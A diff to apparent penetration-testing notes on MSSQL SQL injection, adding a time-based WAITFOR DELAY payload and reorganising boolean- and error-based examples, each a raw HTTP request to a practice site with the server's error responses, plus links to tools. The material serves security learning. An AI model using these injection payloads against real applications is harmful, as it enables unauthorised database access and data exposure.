@@ -1,6 +1,14 @@
 # mssql_danger_functionalities_and_misconfigurations
 
-# Boolean Based
+## Techniques
+### Time Based
+Req
+```http
+GET /Make/2?orderby=supercarid;WAITFOR+DELAY+'00:00:04'-- HTTP/2
+Host: hack-yourself-first.com
+```
+
+### Boolean Based
 Req
 ```http
 GET /Make/2?orderby=(select+CASE+WHEN+(1=2)+THEN+'supercarid'+ELSE+(SELECT+1+Union+select+2)+END)-- HTTP/2
@@ -12,7 +20,7 @@ Status code 500
 Subquery returned more than 1 value
 ```
 
-# Error Based
+### Error Based
 Req
 ```
 GET /Make/2?orderby=(CONVERT(INT%2c@@version))-- HTTP/2
@@ -27,3 +35,7 @@ Conversion failed when converting the nvarchar value 'Microsoft SQL Azure (RTM) 
 ### Inspired by
 * https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
 * https://www.madeiradata.com/post/how-to-protect-sql-server-from-hackers-and-penetration-tests
+
+### Resources
+* https://github.com/ktaranov/sqlserver-kit
+* https://github.com/quentinhardy/msdat
